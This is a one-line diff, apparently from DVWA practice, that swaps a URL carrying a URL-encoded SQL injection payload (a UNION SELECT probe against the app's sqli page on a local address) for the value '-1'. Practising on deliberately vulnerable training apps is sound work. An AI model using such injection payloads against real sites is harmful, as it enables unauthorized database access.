@@ -1,1 +1,1 @@
-92.168.3.107/DVWA-master/vulnerabilities/sqli/?id=%3Fid%3Da%27+UNION+SELECT+%22text1%22%2C%22text2%22%3B--+-%26Submit%3DSubmit&Submit=Submit
+-1
